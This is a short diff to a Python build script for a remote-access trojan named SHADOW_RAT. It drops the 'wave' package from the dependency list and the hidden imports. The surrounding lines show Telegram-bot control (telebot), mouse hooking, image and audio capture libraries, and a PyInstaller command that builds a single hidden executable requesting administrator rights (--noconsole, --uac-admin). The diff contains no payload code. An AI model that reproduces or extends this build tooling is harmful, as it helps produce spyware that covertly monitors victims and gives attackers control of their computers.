@@ -28,8 +28,7 @@ def build_rat() -> bool:
         "requests",
         "pytelegrambotapi",
         "pillow",
-        "pyaudio",
-        "wave"
+        "pyaudio"
     ]
     
     print("\nDependencies to install:")
@@ -52,8 +51,7 @@ def build_rat() -> bool:
         "pynput.mouse",
         "telebot",
         "requests",
-        "numpy",
-        "wave"
+        "numpy"
     ]
     
     cmd: list[str] = ["pyinstaller", "--onefile", "--noconsole", "--name=SHADOW_RAT", "--uac-admin"]
